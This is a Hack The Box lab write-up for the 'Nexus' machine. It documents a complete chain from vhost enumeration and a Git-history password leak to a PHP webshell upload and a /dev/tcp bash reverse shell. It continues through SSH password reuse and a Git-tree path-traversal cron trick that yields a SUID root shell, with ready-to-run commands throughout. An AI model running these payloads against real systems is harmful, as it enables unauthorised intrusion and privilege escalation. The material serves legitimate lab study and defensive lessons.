---
title: "HTB Nexus Writeup"
summary: "Linux writeup covering vhost enumeration, Gitea Git history secret leakage, Krayin CRM upload RCE, password reuse, and Gitea template-sync privilege escalation."
date: 2026-06-28
tags:
  - htb
  - linux
  - web
  - git
  - gitea
  - krayin
  - file-upload
  - password-reuse
  - privilege-escalation
category: "hack-the-box"
difficulty: "info"
platform: "hackthebox"
draft: false
featured: false
---

# Hack The Box - Nexus Writeup
## Machine Overview

|Item|Details|
|---|---|
|Machine|Nexus|
|Platform|Hack The Box|
|OS|Linux / Ubuntu|
|Difficulty|Medium-style attack chain|
|Target IP|`10.129.12.199`|
|Attack IP|`10.10.14.224`|

### Summary

Nexus involved a multi-stage web-to-root attack path:

1. Enumerated virtual hosts and discovered `git.nexus.htb` and `billing.nexus.htb`.

2. Found a public Gitea instance with a public repository.

3. Cloned the repository and extracted an old password from Git history.

4. Used password reuse to log in to Krayin CRM.

5. Exploited an authenticated TinyMCE upload endpoint to upload a PHP webshell.

6. Used the webshell to get a reverse shell as `www-data`.

7. Read the live Krayin `.env` file and found the real database password.

8. Reused that password over SSH as `jones` and captured `user.txt`.

9. Found a root-owned Gitea template sync timer.

10. Abused unsafe path handling in the sync script to write a root cron file.

11. Created a SUID root bash binary and captured `root.txt`.


Final flags:

```text
user.txt: 347eede9407e77af48adea30ab6ec9b5
root.txt: 58fd3ff233ccbf297022ef0dc9b5d4ec
```

---

# 1. Initial Enumeration

## 1.1 Port Scan

I started with a normal TCP scan against the target.

```bash
nmap -sC -sV -oN scans/nmap-initial.txt 10.129.12.199
```

The important exposed services were:

```text
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  nginx 1.24.0 Ubuntu
```

Only SSH and HTTP were externally reachable. That usually means the main attack surface is the web application on port `80`.

---

## 1.2 Hosts File Setup

Since this is an HTB machine, virtual hosts were likely involved. I added the base domain and likely subdomains to `/etc/hosts`.

```bash
sudo nano /etc/hosts
```

Added:

```text
10.129.12.199 nexus.htb git.nexus.htb billing.nexus.htb
```

This lets the browser and CLI tools resolve the internal HTB hostnames correctly.

---

# 2. Web Enumeration

## 2.1 Main Site: `nexus.htb`

I visited the main site:

```bash
curl -i http://nexus.htb/
```

The page was a static public-facing site for:

```text
Nexus Energy Authority — Powering the Nation's Future
```

I saved the HTML and searched for emails and useful strings:

```bash
mkdir -p loot scans

curl -s http://nexus.htb/ -o loot/index.html

grep -Eio '[A-Za-z0-9._%+-]+@nexus\.htb' loot/index.html | sort -u | tee loot/emails.txt
cut -d@ -f1 loot/emails.txt | sort -u | tee loot/users.txt
```

Found emails:

```text
careers@nexus.htb
j.matthew@nexus.htb
```

Possible usernames:

```text
careers
j.matthew
```

At this stage, these were useful for later credential testing.

---

## 2.2 Virtual Host Fuzzing

The main site did not expose obvious routes, so I fuzzed virtual hosts.

Before fuzzing, I checked the default invalid vhost response size:

```bash
curl -s -H "Host: random.nexus.htb" http://10.129.12.199/ -o /tmp/base.html
wc -c /tmp/base.html
```

The invalid vhost response size was:

```text
154
```

Then I fuzzed subdomains:

```bash
ffuf -u http://10.129.12.199/ \
  -H "Host: FUZZ.nexus.htb" \
  -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 154 \
  -o scans/ffuf-vhosts.json
```

Valid virtual hosts discovered:

```text
git      [Status: 200, Size: 14474]
billing  [Status: 302, Size: 390]
```

Important findings:

|VHost|Purpose|
|---|---|
|`git.nexus.htb`|Gitea instance|
|`billing.nexus.htb`|Krayin CRM instance|

This was the first major pivot. The public site was mostly a decoy; the real attack surface was on the internal apps.

---

# 3. Gitea Enumeration — `git.nexus.htb`

## 3.1 Identify Gitea

I opened the Git vhost:

```bash
curl -i http://git.nexus.htb/
curl -s http://git.nexus.htb/ | tee loot/git.html
```

The page title and footer confirmed Gitea:

```text
Gitea: Git with a cup of tea
Version: 1.26.0
```

I also queried the API version endpoint:

```bash
curl -s http://git.nexus.htb/api/v1/version | jq
```

Output:

```json
{
  "version": "1.26.0"
}
```

Registration was enabled:

```bash
curl -i http://git.nexus.htb/user/sign_up
```

And the login page was available:

```bash
curl -i http://git.nexus.htb/user/login
```

---

## 3.2 Gitea Directory Fuzzing

I fuzzed paths on the Gitea vhost:

```bash
ffuf -u http://git.nexus.htb/FUZZ \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
  -ic \
  -fs 14474,49296,154 \
  -o scans/ffuf-git.json
```

Interesting results:

```text
/admin  [Status: 200]
/jones  [Status: 200]
/v2     [Status: 401]
```

This revealed public Gitea users:

```text
admin
jones
```

The `/v2` endpoint looked like a Docker registry-style API endpoint, but it did not become the main path.

---

## 3.3 Public Repository Discovery

I queried public repositories through the Gitea API.

```bash
curl -s http://git.nexus.htb/api/v1/users/admin/repos | jq
curl -s http://git.nexus.htb/api/v1/users/jones/repos | jq
```

The `jones` user had no public repositories, but `admin` had one public repository:

```text
admin/krayin-docker-setup
```

Repository URL:

```text
http://git.nexus.htb/admin/krayin-docker-setup
```

Clone URL:

```text
http://git.nexus.htb/admin/krayin-docker-setup.git
```

This was highly relevant because the billing vhost was running Krayin CRM.

---

# 4. Repository Analysis

## 4.1 Clone the Public Repo

```bash
cd ~/Desktop/01_CTF/HackTheBox/Machines/NExus/loot

git clone http://git.nexus.htb/admin/krayin-docker-setup.git

cd krayin-docker-setup
find . -maxdepth 4 -type f | sort
```

Files found:

```text
.env
docker-compose.yml
documents
```

---

## 4.2 Inspect `.env` and `docker-compose.yml`

```bash
cat .env
cat docker-compose.yml
```

The repository `.env` showed placeholder-style values:

```env
APP_NAME='Krayin CRM'
APP_ENV=local
APP_DEBUG=true
APP_URL=http://billing.nexus.htb

DB_CONNECTION=mysql
DB_HOST=krayin-mysql
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=
```

The Docker Compose file showed a Krayin app, MySQL, and phpMyAdmin:

```yaml
services:
  krayin-app:
    image: webkul/krayin:latest
    ports:
      - "80:80"

  krayin-mysql:
    image: mysql:8.0

  krayin-phpmyadmin:
    image: phpmyadmin:latest
    ports:
      - "8080:80"
```

At first, `DB_PASSWORD` looked empty. However, Git history needed to be checked.

---

## 4.3 Git History Secret Leak

I checked the Git log and diffs:

```bash
git log --oneline --all
git diff HEAD~1 HEAD
```

Commits:

```text
9b817fa Upload files to "/"
1615c46 Upload files to "/"
```

The diff showed that the DB password had been removed:

```diff
-DB_PASSWORD=N27xh!!2ucY04
+DB_PASSWORD=
```

I also grepped the full Git history for secrets:

```bash
git grep -nE 'password|secret|token|APP_KEY|DB_PASSWORD|MAIL_PASSWORD' $(git rev-list --all)
```

Important leaked secret:

```text
DB_PASSWORD=N27xh!!2ucY04
```

This is a classic mistake: removing a secret from the latest commit does not remove it from Git history.

At this stage, I had:

```text
Leaked password: N27xh!!2ucY04
Possible users:
- j.matthew@nexus.htb
- careers@nexus.htb
- admin@nexus.htb
- jones
```

---

# 5. Billing App Enumeration — `billing.nexus.htb`

## 5.1 Identify Application

The billing vhost redirected to an admin login page:

```bash
curl -i http://billing.nexus.htb/
```

Response:

```text
HTTP/1.1 302 Found
Location: http://billing.nexus.htb/admin/login
```

I followed the redirect:

```bash
curl -Ls -D loot/billing.follow.headers http://billing.nexus.htb/ | tee loot/billing.html
```

The login page showed:

```text
Krayin CRM
Powered by Krayin, an open-source project by Webkul.
```

The login form action was:

```text
/admin/login
```

Fields:

```text
email
password
_token
```

So this was a Laravel-based Krayin CRM application.

---

## 5.2 Laravel Debugbar Exposure

The billing page also loaded Laravel Debugbar assets:

```text
/_debugbar/assets/stylesheets
/_debugbar/assets/javascript
```

The debugbar leaked sensitive environment information:

```text
Laravel Version: 12.54.1
PHP Version: 8.3.6
Environment: local
Debug Mode: Enabled
URL: billing.nexus.htb
Timezone: Asia/Kolkata
```

It also leaked internal file paths such as:

```text
/var/www/krayin/packages/Webkul/Admin/src/Resources/views/sessions/login.blade.php
/var/www/krayin/packages/Webkul/Admin/src/Http/Controllers/User/SessionController.php
```

This was important because it confirmed:

1. The app was in debug/local mode.

2. The filesystem path was `/var/www/krayin`.

3. The backend was Laravel/Krayin.

4. Internal controllers and routes were visible.


Debugbar was not the direct RCE, but it made exploitation and route discovery easier.

---

# 6. Credential Testing

## 6.1 Test Default Krayin Credentials

Krayin commonly uses an admin login, so I tested default-style credentials first:

```bash
curl -c loot/billing.cookie -s http://billing.nexus.htb/admin/login -o loot/login.html

TOKEN=$(grep -oP 'name="_token" value="\K[^"]+' loot/login.html)

curl -i -b loot/billing.cookie -c loot/billing.cookie \
  -X POST http://billing.nexus.htb/admin/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "email=admin%40example.com&password=admin123&_token=$TOKEN"
```

This redirected back to login, so defaults failed.

---

## 6.2 Test Leaked Password Against Users

I tested the leaked Git password:

```text
N27xh!!2ucY04
```

Against likely CRM users.

The successful credential pair was:

```text
j.matthew@nexus.htb : N27xh!!2ucY04
```

Login returned a redirect to:

```text
/admin/dashboard
```

That confirmed valid CRM access.

This was the first authentication pivot:

```text
Git history password leak
→ password reuse
→ CRM login as j.matthew
```

---

# 7. Initial Foothold — Authenticated PHP Upload

## 7.1 Why TinyMCE Upload Was Interesting

The application had an authenticated TinyMCE upload route:

```text
/admin/tinymce/upload
```

Laravel Debugbar showed the route/controller:

```text
Webkul\Admin\Http\Controllers\TinyMCEController@upload
```

TinyMCE upload endpoints are often used for image upload features. If validation is weak, uploading a PHP file can result in arbitrary code execution.

---

## 7.2 Correct Login Session Handling

I first had a mistake because I was in the wrong directory and used a bad relative path:

```text
grep: loot/login.html: No such file or directory
HTTP/1.1 419 unknown status
```

The `419` status was Laravel CSRF failure.

The fix was to work from the correct machine directory and preserve cookies/tokens properly:

```bash
cd ~/Desktop/01_CTF/HackTheBox/Machines/NExus
mkdir -p loot

PASS='N27xh!!2ucY04'
EMAIL='j.matthew@nexus.htb'

rm -f loot/auth.cookie loot/login.html loot/upload.txt

curl -c loot/auth.cookie -s http://billing.nexus.htb/admin/login -o loot/login.html

TOKEN=$(grep -oP 'name="_token" value="\K[^"]+' loot/login.html)

curl -s -i -b loot/auth.cookie -c loot/auth.cookie \
  -X POST http://billing.nexus.htb/admin/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "email=$EMAIL" \
  --data-urlencode "password=$PASS" \
  --data-urlencode "_token=$TOKEN" | tee loot/login.response
```

Then I verified access to the dashboard:

```bash
curl -s -b loot/auth.cookie -L http://billing.nexus.htb/admin/dashboard | tee loot/dashboard.html

grep -Ei 'Dashboard|Sign Out|j.matthew|Krayin' loot/dashboard.html | head
```

---

## 7.3 Upload PHP Webshell

I created a simple PHP command webshell:

```bash
cat > /tmp/shell.php <<'EOF'
<?php system($_GET['cmd'] ?? 'id'); ?>
EOF
```

Then extracted a CSRF token and uploaded it:

```bash
TOKEN=$(grep -oP 'name="_token" value="\K[^"]+' loot/dashboard.html | head -1)

curl -s -i -b loot/auth.cookie -c loot/auth.cookie \
  -F "_token=$TOKEN" \
  -F "file=@/tmp/shell.php;type=image/jpeg" \
  http://billing.nexus.htb/admin/tinymce/upload | tee loot/upload.txt
```

The upload returned JSON:

```json
{
  "location": "http://billing.nexus.htb/storage/tinymce/2c8eaf9215746fd3dd67ad6e5efe3ac8.php"
}
```

This confirmed that the PHP file was uploaded into a web-accessible location.

---

## 7.4 Confirm Command Execution

I saved the webshell URL:

```bash
URL='http://billing.nexus.htb/storage/tinymce/2c8eaf9215746fd3dd67ad6e5efe3ac8.php'
```

Then tested command execution:

```bash
curl --get "$URL" --data-urlencode "cmd=id"
curl --get "$URL" --data-urlencode "cmd=whoami"
curl --get "$URL" --data-urlencode "cmd=hostname"
```

The command execution confirmed RCE as the web user.

---

## 7.5 Reverse Shell

I started a listener on Kali:

```bash
nc -lvnp 4444
```

Then triggered a bash reverse shell through the webshell:

```bash
curl --get "$URL" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.224/4444 0>&1'"
```

Connection received:

```text
connect to [10.10.14.224] from (UNKNOWN) [10.129.12.199]
bash: cannot set terminal process group
bash: no job control in this shell
www-data@nexus:~/krayin/storage/app/public/tinymce$
```

I upgraded the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 cols 120
```

Current user:

```bash
id
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Hostname:

```bash
hostname
```

Output:

```text
nexus
```

At this point, I had a foothold as:

```text
www-data@nexus
```

---

# 8. Post-Exploitation as `www-data`

## 8.1 Enumerate Home Directories

```bash
ls -la /home
```

Output:

```text
drwxr-x---  2 git   git   4096 May 12 12:27 git
drwxr-x---  3 jones jones 4096 May 12 12:26 jones
```

I tried to read `user.txt`:

```bash
find /home -name user.txt -type f -readable 2>/dev/null -exec cat {} \;
```

No output, because `www-data` did not have permission to read `/home/jones`.

So the next goal was lateral movement from `www-data` to `jones`.

---

## 8.2 Read Runtime Krayin `.env`

The Git repository had an old/stale `.env`, but the live application had the real `.env`.

```bash
cd /var/www/krayin

ls -la
cat .env
```

Important values:

```env
APP_NAME="Krayin CRM"
APP_ENV=local
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```

This revealed the real MySQL credential:

```text
krayin : y27xb3ha!!74GbR
```

This password was different from the old Git-history password.

---

## 8.3 Local Services

I checked listening services:

```bash
ss -lntp
```

Important results:

```text
127.0.0.1:3306   MySQL
127.0.0.1:3000   Gitea
0.0.0.0:22       SSH
0.0.0.0:80       nginx
```

Processes confirmed:

```bash
ps auxww | grep -Ei 'mysql|mariadb|gitea|krayin|php|nginx|docker' | grep -v grep
```

Interesting processes:

```text
git      /usr/local/bin/gitea web --config /etc/gitea/app.ini
mysql    /usr/sbin/mysqld
www-data php-fpm: pool www
nginx    nginx worker process
```

This confirmed that MySQL and Gitea were both running locally on the same host.

---

## 8.4 Access MySQL

I used the live DB password:

```bash
DBPASS='y27xb3ha!!74GbR'

mysql -h 127.0.0.1 -u krayin -p"$DBPASS" krayin -e 'show tables;'
```

Tables included:

```text
users
persons
personal_access_tokens
user_password_resets
emails
leads
organizations
roles
```

I dumped the users table:

```bash
mysql -h 127.0.0.1 -u krayin -p"$DBPASS" krayin \
  -e "select id,name,email,password from users;"
```

Output:

```text
+----+-------+---------------------+--------------------------------------------------------------+
| id | name  | email               | password                                                     |
+----+-------+---------------------+--------------------------------------------------------------+
|  1 | james | j.matthew@nexus.htb | $2y$10$ez0AouNyeP4NmwjLSV5vCOAJxMLi.6fCKmGC3M6Ve5xJmWJOLRJ5i |
+----+-------+---------------------+--------------------------------------------------------------+
```

The hash was useful evidence, but the real move was to test the DB password for OS password reuse.

---

# 9. Lateral Movement to `jones`

From Kali, I tested SSH password reuse:

```bash
PASS='y27xb3ha!!74GbR'
IP=10.129.12.199

for u in jones git www-data j.matthew; do
  echo "=== $u ==="
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $u@$IP \
    'id; hostname; cat ~/user.txt 2>/dev/null' 2>&1
done
```

Successful login:

```text
=== jones ===
uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)
nexus
347eede9407e77af48adea30ab6ec9b5
```

Failed users:

```text
git
www-data
j.matthew
```

So the live Krayin DB password was reused as the Linux password for `jones`.

Credential:

```text
jones : y27xb3ha!!74GbR
```

I SSHed in:

```bash
ssh jones@10.129.12.199
```

Then read the user flag:

```bash
cat ~/user.txt
```

Output:

```text
347eede9407e77af48adea30ab6ec9b5
```

---

# 10. Privilege Escalation Enumeration

## 10.1 Basic Checks

As `jones`:

```bash
id
hostname
pwd
ls -la ~
sudo -l
```

Output:

```text
uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)
```

Home directory:

```text
/home/jones
```

Sudo result:

```text
Sorry, user jones may not run sudo on nexus.
```

So `sudo` was not the root path.

---

## 10.2 Gitea Config Permissions

I checked Gitea files:

```bash
cat /etc/gitea/app.ini 2>/dev/null
ls -la /etc/gitea /var/lib/gitea /home/git 2>/dev/null
find / -name app.ini -o -name gitea.db -o -name "*.db" 2>/dev/null
```

Output:

```text
/etc/gitea:
-rw-r----- 1 git git 1586 app.ini
-rw-r----- 1 git git   89 template-sync.conf
-rw-r--r-- 1 git git 4184 template-sync.py
```

`jones` could not read `app.ini` or `template-sync.conf`, but could read:

```text
/etc/gitea/template-sync.py
```

That was suspicious.

---

## 10.3 SUID and Capabilities

```bash
find / -perm -4000 -type f 2>/dev/null
```

Only normal SUID binaries appeared:

```text
/usr/bin/passwd
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
```

Capabilities:

```bash
getcap -r / 2>/dev/null
```

Notable but not useful:

```text
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/snapd/snap-confine ... cap_sys_admin ...
```

No obvious direct privesc here.

---

## 10.4 Cron and Timers

I checked cron and systemd timers:

```bash
ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null

systemctl list-timers --all 2>/dev/null | head -50
```

Interesting custom timer:

```text
gitea-template-sync.timer
```

It ran every minute:

```text
NEXT                            LEFT  UNIT
Sat 2026-06-27 13:14:56 UTC      11s  gitea-template-sync.timer
```

This was the big privilege escalation clue.

---

# 11. Root Timer Analysis

## 11.1 Inspect Timer and Service

```bash
systemctl cat gitea-template-sync.timer
systemctl cat gitea-template-sync.service
systemctl status gitea-template-sync.service --no-pager
```

Timer:

```ini
[Unit]
Description=Run Gitea template sync every minute

[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
Unit=gitea-template-sync.service

[Install]
WantedBy=timers.target
```

Service:

```ini
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

Important detail:

```text
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
```

So every minute, root executed:

```bash
/usr/bin/python3 /etc/gitea/template-sync.py
```

This was likely the intended privesc path.

---

## 11.2 Read `template-sync.py`

```bash
sed -n '1,260p' /etc/gitea/template-sync.py
```

Important constants:

```python
GITEA_URL = "http://localhost:3000"
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"
LOG_FILE = "/var/log/template-sync.log"
```

The script loaded a token from:

```python
for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']:
```

Then searched for Gitea repositories marked as templates:

```python
url = "%s/api/v1/repos/search?limit=50" % GITEA_URL

return [r for r in repos if r.get('template', False)]
```

For each template repo, it ran:

```python
git ls-tree -r HEAD
```

Then extracted each blob to the staging directory:

```python
target = os.path.join(stage_path, filepath)
target_dir = os.path.dirname(target)

os.makedirs(target_dir, exist_ok=True)

with open(target, 'wb') as f:
    f.write(cat_result.stdout)
```

This was vulnerable.

---

# 12. Understanding the Root Vulnerability

## 12.1 The Bug

The vulnerable line was:

```python
target = os.path.join(stage_path, filepath)
```

There was no validation that `target` stayed inside:

```text
/home/git/template-staging/<owner>/<repo>
```

So if I could control `filepath`, I could make root write outside the staging directory.

Example malicious path:

```text
../../../../../etc/cron.d/nexus
```

If root writes to that path, it creates:

```text
/etc/cron.d/nexus
```

Because the service runs as root, the file is written as root.

---

## 12.2 Why Normal Git Is Not Enough

Normally, Git does not let you simply create a file path like:

```text
../../../../../etc/cron.d/nexus
```

with normal filesystem operations because `..` is interpreted by the OS.

However, Git trees can be crafted manually using low-level plumbing commands like:

```bash
git mktree
git commit-tree
git update-ref
```

This allows creating tree entries named `..`, which appear in `git ls-tree` output as:

```text
../../../../../etc/cron.d/nexus
```

The root script trusted that path and wrote it directly with Python.

---

## 12.3 Exploitation Strategy

The root-owned sync service does this:

```text
Gitea template repo
→ git ls-tree
→ get blob paths
→ write files into staging directory
```

I abused it like this:

```text
Create Gitea template repo
→ push crafted Git tree containing ../../../../../etc/cron.d/nexus
→ wait for root timer
→ root writes /etc/cron.d/nexus
→ cron executes root command
→ command creates SUID bash at /tmp/rootbash
→ /tmp/rootbash -p gives euid=0
```

Cron payload:

```cron
* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
```

This creates a root-owned SUID copy of bash:

```text
/tmp/rootbash
```

Then:

```bash
/tmp/rootbash -p
```

The `-p` option preserves effective UID, giving a root shell.

---

# 13. Building the Malicious Git Tree

On Kali:

```bash
rm -rf /tmp/nexus-privesc
mkdir /tmp/nexus-privesc
cd /tmp/nexus-privesc

git init -q
git config user.email "j.matthew@nexus.htb"
git config user.name "jones"
```

Create cron payload as a Git blob:

```bash
PAYLOAD='* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'

blob=$(printf '%s\n' "$PAYLOAD" | git hash-object -w --stdin)
```

Build a Git tree manually.

First create file `nexus`:

```bash
t=$(printf '100644 blob %s\tnexus\n' "$blob" | git mktree)
```

Wrap it in `cron.d`:

```bash
t=$(printf '040000 tree %s\tcron.d\n' "$t" | git mktree)
```

Wrap it in `etc`:

```bash
t=$(printf '040000 tree %s\tetc\n' "$t" | git mktree)
```

Then wrap it in five parent traversal directories named `..`:

```bash
for i in 1 2 3 4 5; do
  t=$(printf '040000 tree %s\t..\n' "$t" | git mktree)
done
```

Create a commit:

```bash
commit=$(printf 'pwn\n' | git commit-tree "$t")
git update-ref refs/heads/main "$commit"
```

Verify tree:

```bash
git ls-tree -r main
```

Output:

```text
100644 blob 8273567275f2749d1664fb0be146688d7cdb4ce0    ../../../../../etc/cron.d/nexus
```

That output confirmed the malicious Git tree was correct.

---

# 14. Create Gitea Template Repository

I logged into Gitea with:

```text
jones : y27xb3ha!!74GbR
```

Then created a repository:

```text
Owner: jones
Repository name: evil-template
Visibility: Public
Template Repository: Enabled
```

Important: the repository must be marked as a template because the root script filters only repos where:

```python
r.get('template', False)
```

If the repo is not a template, the root service ignores it.

---

# 15. Push Malicious Tree

At first, I accidentally tried to use a placeholder literally:

```bash
git remote add origin http://git.nexus.htb/<USER>/evil-template.git
```

In `zsh`, `<USER>` is treated as redirection, causing:

```text
zsh: no such file or directory: USER
```

The fix was to use the real username:

```bash
cd /tmp/nexus-privesc

git remote remove origin 2>/dev/null
git remote add origin http://git.nexus.htb/jones/evil-template.git
git remote -v
```

Then push:

```bash
git push -u origin main --force
```

Credentials:

```text
Username: jones
Password: y27xb3ha!!74GbR
```

Successful push:

```text
Enumerating objects: 10, done.
Writing objects: 100% (10/10), 519 bytes
remote: Processing 1 references
To http://git.nexus.htb/jones/evil-template.git
 * [new branch]      main -> main
branch 'main' set up to track 'origin/main'.
```

---

# 16. Root Shell

After the timer ran and cron executed, I checked for `/tmp/rootbash`.

Then executed:

```bash
/tmp/rootbash -p
```

Confirmed root effective UID:

```bash
id
```

Output:

```text
uid=1000(jones) gid=1000(jones) euid=0(root) groups=1000(jones),100(users)
```

This means the real UID was still `jones`, but the effective UID was root. That is enough to read root-owned files and operate with root privileges through the SUID bash process.

Read root flag:

```bash
cat /root/root.txt
```

Output:

```text
58fd3ff233ccbf297022ef0dc9b5d4ec
```

Machine rooted.

---

# 17. Cleanup

After capturing the flag, I removed the artifacts:

```bash
rm -f /etc/cron.d/nexus
rm -f /tmp/rootbash
exit
```

Optional cleanup in Gitea:

```text
Delete jones/evil-template
```

---

# 18. Full Attack Path

```text
1. Nmap found SSH and HTTP.
2. Main site revealed nexus.htb branding and emails.
3. VHost fuzzing found git.nexus.htb and billing.nexus.htb.
4. git.nexus.htb exposed Gitea 1.26.0.
5. Gitea public repo admin/krayin-docker-setup was accessible.
6. Git history leaked old DB password: N27xh!!2ucY04.
7. billing.nexus.htb ran Krayin CRM with Laravel Debugbar enabled.
8. Password reuse allowed login to Krayin as j.matthew@nexus.htb.
9. Authenticated TinyMCE upload accepted a PHP file.
10. Uploaded PHP webshell to /storage/tinymce/.
11. Webshell gave RCE and reverse shell as www-data.
12. Runtime /var/www/krayin/.env exposed real DB password: y27xb3ha!!74GbR.
13. DB password was reused as Linux SSH password for jones.
14. SSH as jones gave user.txt.
15. Enumeration found gitea-template-sync.timer running as root every minute.
16. template-sync.py extracted files from Gitea template repos without path sanitization.
17. Crafted Git tree path ../../../../../etc/cron.d/nexus.
18. Root sync service wrote a cron file.
19. Cron created /tmp/rootbash with SUID bit.
20. /tmp/rootbash -p gave euid=0.
21. Read /root/root.txt.
```

---

# 19. Why Each Exploit Worked

## Git History Secret Leak

The repository owner removed the password from the latest `.env`, but did not rewrite Git history.

Git still retained the old value:

```text
DB_PASSWORD=N27xh!!2ucY04
```

This worked because Git is append/history-based. Deleting a secret from a new commit does not remove it from previous commits.

---

## Password Reuse

The leaked Git password was reused for the Krayin CRM account:

```text
j.matthew@nexus.htb : N27xh!!2ucY04
```

Later, the live DB password was reused for the Linux account:

```text
jones : y27xb3ha!!74GbR
```

Password reuse turned application secrets into system access.

---

## Authenticated File Upload to RCE

The TinyMCE upload route allowed an authenticated user to upload a PHP file and returned a web-accessible location:

```text
/storage/tinymce/2c8eaf9215746fd3dd67ad6e5efe3ac8.php
```

Because the file was executable by PHP-FPM, accessing it with:

```text
?cmd=id
```

executed system commands as `www-data`.

---

## Runtime `.env` Exposure

Once inside as `www-data`, the Laravel application directory was readable:

```text
/var/www/krayin/.env
```

That file contained the real production database credentials:

```text
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```

This enabled database access and password reuse testing.

---

## Gitea Template Sync Path Traversal

The root script trusted file paths returned by:

```bash
git ls-tree -r HEAD
```

Then wrote them directly using:

```python
target = os.path.join(stage_path, filepath)
```

There was no check like:

```python
real_target.startswith(real_stage_path)
```

So a crafted path escaped the staging directory and wrote into `/etc/cron.d`.

Because the script ran as root, this became an arbitrary root file write.

---

## SUID Bash

The malicious cron file ran:

```cron
* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
```

The permission `4755` means:

```text
4 = SUID bit
755 = executable by everyone
```

So `/tmp/rootbash` ran with effective UID root.

Using:

```bash
/tmp/rootbash -p
```

preserved the elevated effective UID.

---

# 20. Key Takeaways

- Always fuzz virtual hosts on HTB web machines.

- Public Git repositories can leak secrets even if the latest commit looks clean.

- Always inspect Git history with `git log`, `git diff`, and `git grep $(git rev-list --all)`.

- Laravel Debugbar in production leaks internal routes, paths, versions, queries, and environment data.

- Authenticated upload endpoints should be treated as high-risk attack surface.

- Runtime `.env` files are high-value post-exploitation targets.

- Password reuse between app, DB, and OS users can turn web access into SSH access.

- Custom systemd timers are often intended privilege escalation paths.

- When root scripts process attacker-controlled Git data, Git tree path manipulation can become arbitrary file write.

- Always validate extracted file paths using canonical paths before writing files.


---

# 21. Important Commands Recap

## VHost Fuzz

```bash
ffuf -u http://10.129.12.199/ \
  -H "Host: FUZZ.nexus.htb" \
  -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 154
```

## Clone Gitea Repo

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup.git
cd krayin-docker-setup
git log --oneline --all
git diff HEAD~1 HEAD
git grep -nE 'password|secret|token|APP_KEY|DB_PASSWORD' $(git rev-list --all)
```

## Krayin Login

```bash
PASS='N27xh!!2ucY04'
EMAIL='j.matthew@nexus.htb'

curl -c loot/auth.cookie -s http://billing.nexus.htb/admin/login -o loot/login.html
TOKEN=$(grep -oP 'name="_token" value="\K[^"]+' loot/login.html)

curl -s -i -b loot/auth.cookie -c loot/auth.cookie \
  -X POST http://billing.nexus.htb/admin/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "email=$EMAIL" \
  --data-urlencode "password=$PASS" \
  --data-urlencode "_token=$TOKEN"
```

## Upload Webshell

```bash
cat > /tmp/shell.php <<'EOF'
<?php system($_GET['cmd'] ?? 'id'); ?>
EOF

curl -s -i -b loot/auth.cookie -c loot/auth.cookie \
  -F "_token=$TOKEN" \
  -F "file=@/tmp/shell.php;type=image/jpeg" \
  http://billing.nexus.htb/admin/tinymce/upload | tee loot/upload.txt
```

## Reverse Shell

```bash
URL='http://billing.nexus.htb/storage/tinymce/2c8eaf9215746fd3dd67ad6e5efe3ac8.php'

nc -lvnp 4444
```

```bash
curl --get "$URL" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.224/4444 0>&1'"
```

## Read Live `.env`

```bash
cat /var/www/krayin/.env
```

## SSH as Jones

```bash
ssh jones@10.129.12.199
# password: y27xb3ha!!74GbR
```

## Inspect Root Timer

```bash
systemctl cat gitea-template-sync.timer
systemctl cat gitea-template-sync.service
sed -n '1,260p' /etc/gitea/template-sync.py
```

## Build Malicious Git Tree

```bash
rm -rf /tmp/nexus-privesc
mkdir /tmp/nexus-privesc
cd /tmp/nexus-privesc

git init -q
git config user.email "j.matthew@nexus.htb"
git config user.name "jones"

PAYLOAD='* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
blob=$(printf '%s\n' "$PAYLOAD" | git hash-object -w --stdin)

t=$(printf '100644 blob %s\tnexus\n' "$blob" | git mktree)
t=$(printf '040000 tree %s\tcron.d\n' "$t" | git mktree)
t=$(printf '040000 tree %s\tetc\n' "$t" | git mktree)

for i in 1 2 3 4 5; do
  t=$(printf '040000 tree %s\t..\n' "$t" | git mktree)
done

